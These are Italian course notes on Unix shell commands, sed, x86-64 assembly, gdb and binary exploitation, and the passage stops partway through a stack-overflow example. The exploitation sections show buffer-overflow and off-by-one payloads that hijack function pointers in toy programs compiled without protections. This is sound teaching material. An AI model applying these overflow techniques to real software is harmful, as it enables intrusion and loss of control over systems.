# Unix shell

La shell di Unix è il modo più semplice per interfacciarsi con il sistema operativo:

- eseguire programmi
- reindirizzare input e output
- connettere programmi
- lanciare script

## Comandi di base

```bash
ls  # mostra il contenuto di una directory
file <filename> # mostra il tipo di file
pwd # mostra il percorso della directory corrente
mkdir <name> # crea una nuova directory
cd <path> # cambia la directory corrente
cat <file> # visualizza il contenuto di un file
cat <f1> <f2> <f3> # concatena e visualizza il contenuto di più file
echo "string" # stampa una stringa sulla console
grep <word> <file> # cerca una parola in un file
man <command> # mostra il manuale di un comando
find <path> -name "expression" # cerca ricorsivamente file che hanno l'espressione nel nome
sort <file> # ordina le righe di un file
strings <file> # estrae le stringhe leggibili da un file binario
```

## Wildcards

Le wildcards sono dei caratteri speciali che vengono interpretate in modo particolare dai comandi:

```bash
* # accetta ogni stringa di caratteri. Esempio:   ls *.txt
? # accetta un singolo carattere. Esempio:        ls file?.txt
[...] # accetta un insieme di caratteri specificato. Esempio:  ls file[1-3].txt
```

Nota che come comportamento di default il ‘.’ all’inizio del nome del file o subito dopo una slash deve essere specificato esplicitamente, le wildcard non lo considerano in automatico.

## Reindirizzamento

Ci sono dei simboli per poter reindirizzare input e output:

- `>`  reindirizza l’output di un comando verso un file **sovrascrivendone** il contenuto già presente
    - es: `ls > tempfile.txt` scrive l’output di `ls` nel file chiamato `tempfile.txt`
- `<` reindirizza il contenuto di un file come input al comando
    - es: `sort < list.txt`
- `>>`  reindirizza l’output di un comando verso un file **aggiungendolo** al contenuto già presente

Linux ha tre stream di input/output di default:

- **stdin (0)**: standard input
- **stdout (1)**: standard output, dove viene stampato il normale output
- **stderr (2)**: standard error, dove vengono stampati gli errori

quindi si può anteporre il numero relativo allo stream per reindirizzare lo standard output oppure lo standard error:

`cat test.txt 2> errors.txt` se “test.txt” non esiste allora l’errore lanciato dal programma andrà nel file “errors.txt”

## Pipe

Le pipe sono la forma base per la comunicazione tra processi, possiamo pensarlo ad un meccanismo di reindirizzamento ma tra due programmi.

`command1 | command2`

l’output di “command1” diventa l’input di “command2”, l’output di “command2” verrà stampato sul terminale.

Un esempio reale è il seguente:

```bash
ls | grep Documents
```

L’output di `ls` viene dato a `grep` il quale cercherà al suo interno occorrenze della stringa “Documents”, le righe che conterranno questa stringa verranno stampate in output.

# Stream editor ed espressioni regolari

Uno **stream editor** è uno strumento usato per fare delle trasformazioni basilari su uno stream testuale in input. Uno strumento a linea di comando di questo tipo appartiene ai tool di base Unix e si chiama “**sed**”.

La struttura base per invocare il programma *sed* è il seguente

```bash
sed <commands> <input_file>
```

Esempio, sostituire la stringa “Gigi” con “Franco” da un testo proveniente dal file di testo chiamato “input.txt”.

```bash
sed "s/Gigi/Franco/" input.txt
```

Possiamo aggiungere l’opzione `-i` che serve per apportare il cambiamento all’interno del file, senza le modifiche vengono solamente stampate nello stream di output, senza che il file non venga toccato

### Comandi sed

Vediamo la sintassi dei comandi che *sed* utilizza per fare le sue trasformazioni.

I comandi sed seguono la seguente struttura:

```bash
[addr]X[options]
```

- `addr` (opzionale): espressione regolare, numero di riga o range di righe, che indica dove si vuole eseguire il comando
- `X` (necessario): una singola lettere che indica l’azione del comando
- `options`(opzionale): opzioni aggiuntive per particolari comandi

Degli esempi di comandi sono: 

- **Delete**, con lettera `d`
    - `sed "1d" input.txt` stampa tutte le righe tranne la prima
    - `sed “1,3d” input.txt` stampa tutte le righe tranne le righe 1, 2 e 3
- **Print**, con lettera `p`
    - `sed "1p" input.txt` stampa la prima riga + stampa di default
    - `sed “1,3p” input.txt` stampa la riga 1, 2 e 3 + stampa di default
    
    Nota: per comportamento di default *sed* cerca sempre di stampare indipendentemente dal comando, quindi con il comando `p` stiamo facendo stampare ciò che già viene stampato di default, ottenendo così che con il comando `sed "1p" input.txt` viene stampata la prima riga 2 volte. Se si vuole forzare la stampa solo delle righe indicate nel comando va aggiunta l’opzione `-n` al programma
    
    - `sed -n “1,3p” input.txt` stampa solo la riga 1, 2 e 3
- **Substitution**, con lettera `s`
    - `sed “s/hello/hi” input.txt` sostituisce la **prima occorrenza su ogni riga** della stringa “hello” con la stringa “hi”. Nota che in questo caso il comando `s` usa due opzioni racchiuse tra slash (`/`)
    - `sed “s/hello/hi/g” input.txt` sostituisce **ogni occorrenza** della stringa “hello” con la stringa “hi”
    - `sed “s/HeLlO/hi/gi” input.txt`sostituisce **ogni occorrenza** della stringa “hello” con la stringa “hi” in modo case insensitive
    
    Nota: il carattere che divide le opzioni è arbitrario, lo slash è quello convenzionale ma si possono usare altri caratteri *single-byte* come:  `.` , `?`
    

- **Mapping**, con lettera **`y`**
    - `sed “y/abc/ABC/” input.txt` fa un mapping carattere per carattere su ogni occorrenza, quindi mappa il primo carattere della prima opzione con il primo carattere della seconda opzione e così via. Si ottiene che tutte le ‘a’ diventano ‘A’, tutte le ‘b’ diventano ‘B’ ecc…

## Espressioni regolari

Le espressioni regolari rappresentano dei pattern di stringhe con strutture particolari.

Ci sono dei caratteri speciali che rappresentano la struttura:

- `^` inizio della riga
- `$` fine della riga
- `.` singolo carattere
- `.*` una sequenza di caratteri (anche una sequenza vuota, o sequenza con spazi)
- `c*`  qualunque numero di occorrenze del carattere ‘c’, anche nessuna occorrenza.
- `c\+` una o più occorrenze di ‘c’
- `c\?` zero o una occorrenze di ‘c’
- `[0-9]`  sequenza di caratteri numerici
- `[^0-9]` sequenza che **non contiene** caratteri numerici

Vediamo delle classi particolari:

| Classe | Significato | Esempio |
| --- | --- | --- |
| [[:alpha:]] | Caratteri alfabetici | [[:alpha:]]+: corrisponde a "abcXYZ" |
| [[:digit:]] | Cifre numeriche | [[:digit:]]{3}: corrisponde a "123" |
| [[:alnum:]] | Caratteri alfanumerici | [[:alnum:]]: corrisponde a "a1B2c3" |
| [[:space:]] | Spazi bianchi | [[:space:]]+: corrisponde a " \t\n" |
| [[:punct:]] | Segni di punteggiatura | [[:punct:]]: corrisponde a "!?.,;" |
| [[:upper:]] | Lettere maiuscole | [[:upper:]]+: corrisponde a "ABC" |
| [[:lower:]] | Lettere minuscole | [[:lower:]]+: corrisponde a "xyz" |
| [[:blank:]] | caratteri vuoti | [[:blank:]]+: corrisponde a spazi e tab |
| [[:print:]] | Caratteri stampabili | [[:print:]]+: corrisponde ai caratteri stampabili, inclusi gli spazi |

Un esempio in un comando sed:

```bash
sed -E 's/[[:digit:]]+/NUMERO/' input.txt
```

Questo comando sostituisce qualsiasi sequenza di una o più cifre con la parola "NUMERO". Ad esempio:

- "Ho 25 anni" diventa "Ho NUMERO anni"

Nota: L'opzione `-E` in sed abilita l'uso di espressioni regolari estese, permettendo una sintassi più avanzata e flessibile per i pattern di ricerca e sostituzione.

### Back reference

Con alcuni comandi è comodo poter fare riferimento al testo *metchato*. questo si può fare con il carattere `&`.

es. aggiungere “world” dopo “hello”

```bash
sed "s/hello/& world/g" input.txt
```

In questo caso `&` assume il valore della stringa *metchata*, cioè “hello”.

È possibile anche riferirsi a dei blocchi racchiusi tra parentesi tonde:

Ad esempio, per scambiare l'ordine di due parole:

```bash
sed "s/\(hello\) \(world\)/\2 \1/" input.txt
```

Questo comando cerca il pattern "hello world" e lo sostituisce con "world hello". Le parentesi tonde creano due gruppi, e `\1` e `\2` si riferiscono rispettivamente al primo e al secondo gruppo.

Nota che i `\` sulle parentesi tonde sono necessari per evitare di considerare le parentesi come caratteri da metchare.

Ci sono delle sintassi particolari non standard, ma fornite da GNU:

- `c\{n\}` ripete `c` n volte
- `\L` converte in lowercase
- `\U` converte in uppercase

# Assembly

Fare *program exploitation* significa far fare qualcosa di non pianificato ad un programma.

Per fare ciò si sfruttano i bug e la manipolazione del codice macchina di file eseguibili.

Generalmente per fare *exploitation* non si dispone del codice sorgente ma solo dell’eseguibile scritto in **linguaggio macchina** (un insieme di byte).

Il linguaggio **assembly** aiuta a rende il linguaggio macchina più leggibile, entrambi il linguaggio macchina e l’assembly dipendono dall’architettura del computer.

Ci concentreremo sull’assembly **x86-64 con sintassi Intel.**

## Panoramica del linguaggio

- Registri *general purpose* per salvare temporaneamente valori e indirizzi:
    
    `rax, rbx, rcx, rdx, r8, ..., r15`
    
- **Stack**: il registro `rsp` rappresenta lo *stack pointer*, mentre `rbp` rappresenta il *base pointer*. Insieme delimitano la dimensione dello stack
- `rip` è *l’instruction pointer* che punta alla **prossima istruzione** da eseguire
- `rsi` e `rdi` sono registri usati principalmente nelle stringhe e nei parametri delle funzioni
- Abbiamo poi il *flag register `rFlag`* che contiene l’informazione sul risultato di precedenti operazioni aritmetiche, logiche e di controllo

Il numero di registri è finito, e in base alla sintassi che utilizziamo ci possiamo riferire ad una porzione specifica di un registro, dal singolo byte fino alla versione a 64 bit, ad esempio con il registro `a`:

![https://i.ibb.co/NtBDd05/image.png](https://i.ibb.co/NtBDd05/image.png)

## Comandi

Nella seguente tabella sono riassunti i principali comandi assembly:


| **Sintassi del comando** | **Spiegazione** | **Esempio** |
| --- | --- | --- |
| `mov dest, src` | Copia il valore di `src` in `dest`. Usato anche per copiare il valore presente all’indirizzo `[src]` in `dest`. Oppure salva il valore di `src` all’indirizzo contenuto in `[dest]` | `mov rax, rbx` (copia il contenuto di `rbx` in `rax`). `mov rax, [rbx]` (carica il valore all'indirizzo contenuto in `rbx` in `rax`). `mov [rbx], rax` (memorizza il valore di `rax` all'indirizzo contenuto in `rbx`) |
| `add dest, src` | Somma il valore di `src` a `dest` e memorizza il risultato in `dest`. | `add rax, 10` (somma 10 a `rax`) |
| `sub dest, src` | Sottrae il valore di `src` da `dest` e memorizza il risultato in `dest`. | `sub rbx, 5` (sottrae 5 da `rbx`) |
| `and dest, src` | Esegue l'operazione logica AND tra `src` e `dest`, salvando il risultato in `dest`. | `and rax, rbx` (AND bit a bit tra `rax` e `rbx`) |
| `push src` | Salva il valore di `src` sullo stack. | `push rax` (salva il contenuto di `rax` sullo stack) |
| `pop dest` | Estrae il valore dallo stack e lo salva in `dest`. | `pop rbx` (estrae il valore dallo stack e lo mette in `rbx`) |
| `cmp dest, src` | Confronta `dest` con `src` sottraendoli (non salva il risultato, ma aggiorna i flag). | `cmp rax, 10` (confronta `rax` con 10) |
| `call label` | Salta all'indirizzo indicato da `label`, salvando l'indirizzo di ritorno sullo stack. | `call my_function` (chiama la funzione `my_function`) |
| `ret` | Ritorna all'indirizzo salvato sullo stack (usato con `call`). | `ret` (ritorna alla chiamata precedente) |
| `leave` | Ripristina il valore di `rsp` da `rbp`, quindi esegue `pop rbp` (chiude lo stack frame corrente). | `leave` (ripristina lo stack frame) |
| `jle label` | Salta a `label` se l'ultimo confronto (`cmp`) ha impostato i flag di minore o uguale (se il risultato è ≤ 0). | `jle done` (salta a `done` se minore o uguale) |
| `jge label` | Salta a `label` se l'ultimo confronto (`cmp`) ha impostato i flag di maggiore o uguale (se il risultato è ≥ 0). | `jge loop` (salta a `loop` se maggiore o uguale) |
| `lea dest, [src]` | Carica l'indirizzo di `src` in `dest` (Load Effective Address). | `lea rax, [rbx+4]` (carica l'indirizzo `rbx + 4` in `rax`) |
| `int imm` | Genera un interrupt software, solitamente usato per chiamare funzioni di sistema. | `int 0x80` (interrompe per una chiamata di sistema su Linux) |
| `nop` | Non fa nulla, occupa solo un ciclo. | `nop` (istruzione vuota) |

Nota l’importante differenza:

```nasm
mov rax, [rbx + 4]   ; Carica il valore contenuto all'indirizzo rbx + 4
lea rax, [rbx + 4]   ; Carica l'indirizzo rbx + 4 in rax
```

## Stack e chiamata di funzione

È utile vedere come è organizzata la memoria di un programma:

![https://i.ibb.co/Bt7wJ9F/image.png](https://i.ibb.co/Bt7wJ9F/image.png)

Vediamo in particolare come lo stack parte da indirizzi alti e man mano che si riempie crescendo verso indirizzi più bassi.

Lo stack è quella zona di memoria dove vengono salvate le variabili locali.

supporta le operazioni di `push` (aggiunta di valori nello stack) e `pop` (rimozione di valori dallo stack)

Quando viene chiamata una funzione viene impostato uno `stack frame`, cioè una zona dello stack (sempre delimitata da `rbp` e `rsp`) utilizzata durante l’esecuzione di una funzione, i valori al suo interno sono in particolare:

- eventuali parametri della funzione che non sono stati passati nei registri
- l’indirizzo del vecchio `rbp`
- le variabili locali alla funzione
- l’indirizzo di ritorno, cioè dove dovrà andare *l’instruction pointer* per continuare l’esecuzione una volta terminata la funzione

Il **passaggio dei parametri** ad una funzione segue una convenzione chiamata **System V AMD64 ABI** la quale stabilisce:

- i primi 6 argomenti passati alla funzione verranno salvati in ordine in: `rdi, rsi, rdx, rcx, r8, r9`
- se ci sono altri argomenti, vengono salvati nello stack
- il valore di ritorno arriva fino a 128bit e verrà salvato automaticamente nei registri `rax` e, solo se necessario (se maggiore di 64bit), `rdx`

### Chiamata della funzione

La chiamata di funzione si divide in quattro fasi

1. salvataggio dei parametri e chiamata alla funzione
    
    ```nasm
    mov rdi, <a>    ; primo parametro in RDI
    mov rsi, <b>    ; secondo parametro in RSI
    call <foo>      ; chiamata della funzione, salva l'indirizzo di ritorno sullo stack
    ```
    
2. creazione dello stack frame (all’interno del corpo della funzione)
    
    ```nasm
    push rbp          ; Salva il vecchio base pointer nello stack
    mov rbp, rsp      ; Imposta il nuovo base pointer
    sub rsp, <size>   ; Riserva spazio per le variabili locali nello stack (se necessario)
    ```
    
3. esecuzione del resto del corpo della funzione
4. ritorno
    
    ```nasm
    mov rax, return_value    ; Carica il valore di ritorno in RAX
    leave                    ; Ripristina base pointer e stack pointer (come fare 'mov rsp, rbp' e poi 'pop rbp')
    ret                      ; Ritorna alla funzione chiamante
    ```
    

## Comparazione assembly e codice C

Vediamo la traduzione assembly del seguente codice C

```c
# include <stdio.h>
int main() {
		int i;
		for (i = 0; i < 10; i++)
				printf("%d ", i);
		printf("\n");
}
```

compilando il codice con `gcc count.c -o count` possiamo poi produrre il codice assembly con il seguente comando: `objdump -M intel -ds count > count.s`

- `-M` permette di specificare la sintassi, nel nostro caso usiamo la sintassi Intel
- `-d` produce il codice assembly
- `-s` mostra le sezioni del programma

Andando all’indirizzo della funzione main, possiamo distinguere tre colonne:

- la prima contiene gli indirizzi di memoria.
- la seconda contiene il linguaggio macchina, cioè i byte di cui è composto il programma
- e nell’ultima il codice assembly

![https://i.ibb.co/g4mGTrX/assembly.png](https://i.ibb.co/g4mGTrX/assembly.png)

## Modificare un file binario

File eseguibili possono essere modificati con particolari editor.

Il programma `xxd` permette di produrre un file di testo contenente i byte in formato esadecimale di un eseguibile.

Una volta modificato il file di testo, `xxd` permette di rigenerare il file binario.

La sequenza di operazioni da fare è:

1. produrre il file di testo contenente i byte dell’eseguibile: `xxd -g 1 count > count.txt`
    - l’opzione `-g 1` permette di scrivere byte distinti
2. modificare il file `count.txt`
3. rigenerare il file eseguibile:
    - `xxd -r count.txt > count2`
    - `chmod +x count2`
    - `./count2`

### Esempio

Modifichiamo l’eseguibile di prima in modo che faccia un ciclo in meno (si ferma a 8 invece che a 9)

Un modo per farlo è quello di cambiare il confronto di ``<=`` in un `<`. Quindi dovremmo cambiare i byte corrispondenti al comando assembly `jle` con i byte del comando `jl`.

1. generiamo un file di testo contenente i byte dell’eseguibile: `xxd -g 1 count > count.txt`
2. Dall’immagine precedente notiamo come i byte del comando `jle` sono `7e e0`, dobbiamo quindi modificare tali byte.
3. Il byte che ci interessa è il `7e` che corrisponde all’opcode del comando `jle` (l’altro byte riguarda dove saltare)
4. Online si possono trovare gli opcode di tutte le istruzioni (ad esempio [qui](http://sparksandflames.com/files/x86InstructionChart.html) oppure [qui](http://ref.x86asm.net/coder32.html)), e troviamo che l’opcode del comando `jl` è `7c`. sostituiamo quindi `7e` con `7c`
5. salviamo il file e lo riconvertiamo in eseguibile con: `xxd -r count.txt > count2` 
6. Diamo i permessi a questo file di essere eseguito con: `chmod +x count2`
7. ed eseguendolo notiamo come i numeri stampati arrivano fino a 8.

# Analisi dei programmi

I programmi possono essere analizzati in due modi:

- **Analisi statica**: che avviene ispezionando il codice assembly dell’eseguibile e provare a capire la logica del programma
- **Analisi dinamica**: che avviene tramite l’uso di programmi chiamati **debugger**, in grado di osservare il comportamento del programma durante l’esecuzione.
    
    Un debugger molto utilizzato è **gdb**.
    

## gdb

Consideriamo sempre il seguente codice:

```c
# include <stdio.h>
int main() {
		int i;
		for (i = 0; i < 10; i++)
				printf("%d ", i);
		printf("\n");
}
```

Una volta compilato il programma possiamo eseguire gdb:

```c
$ gcc -g count.c -o count
$ gdb -q count
```

nota che l’opzione `-g` sulla compilazione è importante perché aggiunge delle informazioni utili che gdb può utilizzare per migliorare la visualizzazione del debugging.

Una volta eseguito gdb apparirà la sua linea di comando, prima di passare al disassemblaggio del programma, impostiamo la sintassi da utilizzare:

```c
(gdb) set disassembly-flavor intel
```

disassembliamo la funzione `main`:

```c
(gdb) disassemble main
```

ottenendo un output del genere

![https://i.ibb.co/ChHynw2/image.png](https://i.ibb.co/ChHynw2/image.png)

È possibile impostare dei breakpoint per fermare l’esecuzione del programma in uno specifico punto (ad esempio su un indirizzo)

```c
(gdb) break main
```

Possiamo lanciare l’esecuzione:

```c
(gdb) run
```

la quale si fermerà sul main.

Rilanciando il disassembly notiamo come gli indirizzi sono stati rilocati

```c
(gdb) disassembly main
```

possiamo quindi mettere un breakpoint sull’indirizzo dell’istruzione che ci interessa, ad esempio sulla riga dentro il ciclo for, con indirizzo di offset <+17>

```c
(gdb) break *0x000055555540069b
```

Possiamo ispezionare i registri nella situazione attuale dell’esecuzione

```c
(gdb) info registers
```

![https://i.ibb.co/8mT5wzM/image.png](https://i.ibb.co/8mT5wzM/image.png)

Possiamo ispezionare anche la memoria con il comando

`x/<num><format><size> <addr>`

dove:

- `num`: numero di elementi da ispezionare
- `format`: formato usato per mostrare il valore in memoria, tra cui abbiamo
    - `o`: ottale
    - `x`: esadecimale
    - `u`: decimale senza segno
    - `t`: binario
    - `i`: istruzione
    - `c`: carattere
    - `s`: stringa
- `size`: grandezza degli elementi
    - `b`: byte
    - `h`: 2 byte (16 bit)
    - `w`: 4 byte (32 bit)
    - `g`: 8 byte (64 bit)

Esempi:

- `(gdb) x/i main+22`:
    
    mostra l’istruzione alla posizione `main+22`
    
    `0x5555554006a0 <main+22>:    lea    rdi,[rip+0xad]        # 0x555555400754`
    
- `(gdb) x/4i $rip`:
    
    mostra le quattro istruzioni rispetto all’instruction pointer
    
    ```c
    0x555555400692 <main+8>:     mov    DWORD PTR [rbp-0x4],0x0
    0x555555400699 <main+15>:    jmp    0x5555554006b5 <main+43>
    0x55555540069b <main+17>:    mov    eax,DWORD PTR [rbp-0x4]
    0x55555540069e <main+20>:    mov    esi,eax
    ```
    
- `(gdb) x/s 0x555555400754`:
    
    mostra il contenuto di quel registro in formato stringa.
    
    `0x555555400754: "%d “`
    

Un utile cheatsheet con i comandi principali di gdb: [https://darkdust.net/files/GDB Cheat Sheet.pdf](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)


# Buffer overflow

Il buffer overflow è una tra le vulnerabilità più comuni tra i software, la principale causa di questa vulnerabilità è la scrittura di codice non corretta e sicura.

Il **buffer overflow** è una condizione in cui è possibile riempire un buffer **oltre** alla sua capacità allocata, andando così a sovrascrivere altre informazioni in memoria.

Questa vulnerabilità viene usata principalmente per:

- far crashare il sistema
- inserire dati che rompono l’integrità
- inserire codice per ottenere il controllo del sistema

Linguaggi come C sono ritenuti “unsafe” e lasciano al programmatore la responsabilità di implementare i dovuti controlli per proteggersi dalle vulnerabilità sulla memoria.

## Rompere l’integrità e crash

Consideriamo il seguente codice C

```c
#include <string.h>
#include <stdio.h>

char buffer1[8] = "one";    // buffer of size 8 initialized with “one”
int value = 5;
char buffer2[8] = "two";    // buffer of size 8 initialized with “two”
int main(int argc, char *argv[]) {
		// prints: address = value,  before user input
	 printf("[BEFORE] buffer1 @ %1$p = %1$s\n", buffer1);
	 printf("[BEFORE] value @ %1$p = 0x%2$08x\n",&value, value);
	 printf("[BEFORE] buffer2 @ %1$p = %1$s\n", buffer2);
	
	 printf("Please enter your input: ");
	 gets(buffer1);     // reads input into buffer1, whatever length!
	 printf("\n");
	  // prints: address = value,  after user input
	 printf("[AFTER] buffer1 @ %1$p = %1$s\n", buffer1);
	 printf("[AFTER] value @ %1$p = 0x%2$08x\n",&value, value);
	 printf("[AFTER] buffer2 @ %1$p = %1$s\n", buffer2);
}
```

Abbiamo quindi  l’allocazione di un buffer, una variabile e un altro buffer.

Viene preso un input utente e viene inserito nel primo buffer.

Esecuzione:

```bash
$ echo "prova" | ./prova
[BEFORE] buffer1 @ 0x7fe3b7d9a010 = one
[BEFORE] value   @ 0x7fe3b7d9a018 = 0x00000005
[BEFORE] buffer2 @ 0x7fe3b7d9a020 = two
Please enter your input:
[AFTER] buffer1 @ 0x7fe3b7d9a010 = prova
[AFTER] value   @ 0x7fe3b7d9a018 = 0x00000005
[AFTER] buffer2 @ 0x7fe3b7d9a020 = two
```

Con questo input non è successo nulla di strano, l’input è stato inserito nel primo buffer.

Notiamo come gli indirizzi delle variabili sono sequenziali, distanziati di 8 byte.

Se la dimensione dell’input rientra nella dimensione del buffer non ci sono problemi, ma non abbiamo controlli per forzare che ciò avvenga sempre, infatti è possibile inserire un input più grande:

```bash
$ echo "AAAAAAAA" | ./prova
[BEFORE] buffer1 @ 0x7f92ba1bc010 = one
[BEFORE] value   @ 0x7f92ba1bc018 = 0x00000005
[BEFORE] buffer2 @ 0x7f92ba1bc020 = two
Please enter your input:
[AFTER] buffer1 @ 0x7f92ba1bc010 = AAAAAAAA
[AFTER] value   @ 0x7f92ba1bc018 = 0x00000000
[AFTER] buffer2 @ 0x7f92ba1bc020 = two
```

la stringa con 8 caratteri ‘A’ va in overflow in quanto la stringa contiene anche il **carattere terminatore** `0x00`. Vediamo infatti che viene sovrascritto il valore della variabile `value`.

Nota che in *little endian* i byte vengono prima scritti quelli meno significativi (quelli più a destra).

Se inseriamo 9 caratteri A, otteniamo il seguente output:

```bash
$ echo "AAAAAAAAA" | ./prova
[BEFORE] buffer1 @ 0x7f669a8de010 = one
[BEFORE] value   @ 0x7f669a8de018 = 0x00000005
[BEFORE] buffer2 @ 0x7f669a8de020 = two
Please enter your input:
[AFTER] buffer1 @ 0x7f669a8de010 = AAAAAAAAA
[AFTER] value   @ 0x7f669a8de018 = 0x00000041
[AFTER] buffer2 @ 0x7f669a8de020 = two
```

Continuando ad aumentare il numero di caratteri in input, continuiamo a sovrascrivere le zone di memoria successive. Otteniamo quindi un **buffer overflow**. Ciò che può limitare la dimensione del nostro input è un errore di **segmentation fault** (e quindi crash del programma), che si verificherebbe nel caso arrivassimo a sovrascrivere zone di memoria non assegnate al nostro processo.

La funzione `gets` è *unsafe* perché non limita in alcun modo la dimensione dell’input, e non dovrebbe venir mai utilizzata, inoltre durante la compilazione appare un *warning* che avverte di ciò.

## Controllare il flusso di codice

Con il buffer overflow è possibili modificare il normale flusso di codice, principalmente in due modi:

- sovrascrivendo il puntatore ad una funzione
- sovrascrivendo con nuovo codice

Ad esempio se definiamo un tipo di dato:

```c
typedef struct element {
	 char data[16];
	 void (*f)(char *);
} element_t;
```

contenente un buffer e un puntatore ad una funzione.

In questo caso un buffer overflow può sovrascrivere il puntatore alla funzione, in modo da eseguire una funzione differente da quella attesa.

Ad esempio:

```c
typedef struct element {
	 char data[16];
	 void (*f)(char *);
} element_t;

void secret_function() {
	 printf("Secret function!\n");
}
void show_data(char *s) {
	 printf("Data = %s\n",s);
}

int main(int argc, char *argv[]) {
	 element_t e;
	 e.f = show_data;   // legitimate function
	 printf("Insert data: ");
	 gets(e.data);      // reads data, possible buffer overflow
	 e.f(e.data);
}
```

L’obiettivo dell’attacco è quello di far invocare la funzione `secret_function()` invece di `show_data()`:

Per semplificare l’attacco disabilitiamo l’opzione di compilazione **PIE** (*Position Independent Executable*) che rende più difficile exploitare la vulnerabilità in quanto renderebbe randomizzata la posizione in memoria del programma.

`$ gcc overflow-struct.c -o overflow-struct --no-pie --static`

Adesso usando gdb, possiamo ottenere l’indirizzo della funzione `secret_function()`:

```nasm
$ gdb -q overflow-struct
...
(gdb) x/x secret_function
	0x400b4d <secret_function>: 0xe5894855
```

Adesso per riuscire a sovrascrivere il puntatore bisogna riempire il buffer fino alla sua dimensione massima con dei dati qualsiasi e poi andare in overflow inserendo l’indirizzo della `secret_function`.

Nota che gli indirizzi sono a 8 byte e sono in little endian

```bash
echo -e "AAAAAAAAAAAAAAAA\x4d\x0b\x40\x00\x00\x00\x00\x00" | ./overflow-struct
Insert data: Secret function!
```

## Off-by-one bug

Un tipico errore di programmazione può essere il seguente, in cui viene sbagliato il controllo sull’indice finale di un ciclo.

```c
typedef struct element {
	 char data[16];
	 void (*f)(char *);
} element_t;

void secret_function() {
	 printf("Secret function!\n");
}
void show_data(char *s) {
	 printf("Data = %s\n",s);
}

int main(int argc, char *argv[]) {
	 element_t e;
	 e.f = show_data; // legitimate function
	 printf("Insert data: ");
	 memset(e.data, 0, sizeof(e.data));
	
	 //the error in the following line is: i<=sizeof(e.data)
	 //it should be i<sizeof(e.data)
	 for (i=0; i<=sizeof(e.data) && (c=getc(stdin))!= EOF && c != '\n'; i++) {
		 e.data[i] = c;
	 }
	 printf("show_data = %p, secret_function = %p\n",show_data,secret_function);
}
```

Con l’ultima `printf` andiamo a controllare gli indirizzi assegnati alle due funzioni: `show_data` e `secret_function`. 

eseguendo il programma più volte notiamo come gli indirizzi delle due funzioni **cambiano solo per l’ultimo byte** (una termina sempre con `dd` e l’altra con `ca` e il resto dell’indirizzo è comune per entrambi).

```c
$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x560bfd9287dd, secret_function = 0x560bfd9287ca

$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x56260d01f7dd, secret_function = 0x56260d01f7ca

$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x5646872967dd, secret_function = 0x5646872967ca

$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x55f42b85f7dd, secret_function = 0x55f42b85f7ca
```

Sfruttando l’errore sul controllo dell’indice del buffer possiamo modificare tale byte, che ci è sufficiente per cambiare la funzione invocata:

```c
$ echo -e "AAAAAAAAAAAAAAAA\xca" | ./overflow-struct-offbyone
Insert data: Secret function!
show_data = 0x560975daa7dd, secret_function = 0x560975daa7ca
```

# Stack overflow

Un *buffer overflow* che si verifica nello stack, si chiama **stack overflow**.

Subito dopo le variabili locali, nello stack sono presenti il **vecchio stack pointer** e l’**indirizzo di ritorno**. Uno stack overflow può sovrascriverli per modificare il flusso di codice ed eseguire codice arbitrario.

Partendo da questa situazione, vediamo gli step che vengono fatti da un `return` di funzione

![https://i.ibb.co/sPGp08Y/image.png](https://i.ibb.co/sPGp08Y/image.png)

1. la `mov` mette in `rax` il valore di ritorno `b` 
2. la `leave` sposta lo *stack pointer* su `<return address>` e sposta il *base pointer* all’indirizzo `old rbp`, cioè nella sua vecchia posizione prima di invocare la funzione
    
    ![https://i.ibb.co/Sc95pV9/image.png](https://i.ibb.co/Sc95pV9/image.png)
    
3. la `ret` imposta l’*instruction pointer* all’indirizzo `return address` (cioè all’istruzione successiva rispetto al momento della chiamata della funzione `func`)

L’idea per sfruttare lo stack overflow è quella di andare a **modificare il *return address*** con un altro che porta a del codice arbitrario.

## Esempio

Considerando il seguente codice:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int checkpassword() {
		char s[16];
		
		printf("Insert password: ");
		// reads password, no check on length!
		gets(s);
		
		if (strcmp(s, "sEgr3t0") == 0)
				return 1;
		else
				return 0;
}

int main(int argc, char *argv[]) {
		if (checkpassword()) {
				printf("Authenticated!\n");
				exit(EXIT_SUCCESS);
		}
		else {
				printf("Wrong password!\n");
				exit(EXIT_FAILURE);
		}
}
```

Supponiamo che la password non possa essere sovrascritta e non possa essere ottenuta dal file binario.

### Caso 1

Compiliamo disabilitando dei sistemi di sicurezza, come **PIE** e lo **stack protector**

`gcc stack-pwd.c -o stack-pwd -fno-stack-protector --no-pie --static`

Analizziamo il programma con GDB:

```bash
gdb stack-pwd -q
```

Impostiamo un breakpoint sulla funzione `checkpassword` e poi facendo `nexti` per eseguire l’istruzione che alloca il buffer `s` del programma.

lanciando poi `info registers` visualizziamo lo stato dei registri dello dello stack:

```bash
(gdb) break checkpassword
(gdb) run
(gdb) nexti
(gdb) info registers
...
rbp            0x7fffffffe570
rsp            0x7fffffffe560
...
```

possiamo ispezionare lo stack

```bash
(gdb) x/4gx $rsp
0x7fffffffe560: 0x00007fffffffe6b8      0x0000000000400400
0x7fffffffe570: 0x00007fffffffe590      0x0000000000400bc0
#indirizzo:      primi 8 byte            secondi 8 byte
```

La prima riga è l’indirizzo dove punta lo *stack pointer* e all’interno ci sono solo dati sporcizia, sono lo spazio allocato per il buffer di 16 byte.

la seconda riga è dove punta il *base pointer* e nei primi 8 byte contiene l’indirizzo al vecchio *base pointer*, mentre nei successivi 8 byte contiene l’indirizzo di ritorno.

L’obiettivo è quello di riempire il buffer, per poi sovrascrivere gli 8 byte contenenti l’indirizzo del vecchio base pointer e poi sovrascrivere l’indirizzo di ritorno con un nuovo indirizzo che punta dove vogliamo.

Troviamo l’indirizzo del nuovo punto dove fare ritorno facendo il disassembly del main:

```bash
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400ba7 <+0>:     push   rbp
   0x0000000000400ba8 <+1>:     mov    rbp,rsp
   0x0000000000400bab <+4>:     sub    rsp,0x10
   0x0000000000400baf <+8>:     mov    DWORD PTR [rbp-0x4],edi
